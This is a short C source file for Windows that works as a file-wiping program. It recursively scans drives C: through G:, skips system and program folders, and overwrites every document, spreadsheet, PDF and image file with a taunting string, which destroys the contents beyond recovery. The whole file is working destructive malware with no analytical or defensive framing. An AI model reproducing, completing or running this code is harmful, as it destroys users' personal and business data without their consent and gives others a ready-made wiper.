#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

const char* EXTENSIONS[] = { ".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".bmp" };
const int EXT_COUNT = sizeof(EXTENSIONS) / sizeof(EXTENSIONS[0]);

const char* SKIP_DIRS[] = {
    "Windows", "Program Files", "Program Files (x86)", 
    "AppData", "ProgramData", "$Recycle.Bin", "System Volume Information"
};
const int SKIP_COUNT = sizeof(SKIP_DIRS) / sizeof(SKIP_DIRS[0]);

const char* TARGET_FOLDERS[] = { "C:\\", "D:\\", "E:\\", "F:\\", "G:\\" };
const int TARGET_COUNT = sizeof(TARGET_FOLDERS) / sizeof(TARGET_FOLDERS[0]);

const char* MESSAGE = "Wooh Delete delete delete........";

int has_target_extension(const char* filename) {
    for (int i = 0; i < EXT_COUNT; i++) {
        const char* ext = strrchr(filename, '.');
        if (ext && _stricmp(ext, EXTENSIONS[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

int should_skip_dir(const char* dir) {
    for (int i = 0; i < SKIP_COUNT; i++) {
        if (_stricmp(dir, SKIP_DIRS[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

void overwrite_file(const char* filepath) {
    FILE* f = fopen(filepath, "wb");
    if (f) {
        fwrite(MESSAGE, 1, strlen(MESSAGE), f);
        fclose(f);
    }
}

void scan_folder(const char* base_path) {
    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", base_path);

    HANDLE hFind = FindFirstFileA(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0)
            continue;

        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", base_path, find_data.cFileName);

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!should_skip_dir(find_data.cFileName)) {
                scan_folder(full_path); // recursive
            }
        } else {
            if (has_target_extension(find_data.cFileName)) {
                overwrite_file(full_path);
            }
        }
    } while (FindNextFileA(hFind, &find_data));
    FindClose(hFind);
}

int main() {
    for (int i = 0; i < TARGET_COUNT; i++) {
        DWORD fType = GetFileAttributesA(TARGET_FOLDERS[i]);
        if (fType != INVALID_FILE_ATTRIBUTES && (fType & FILE_ATTRIBUTE_DIRECTORY)) {
            scan_folder(TARGET_FOLDERS[i]);
        }
    }
    return 0;
}
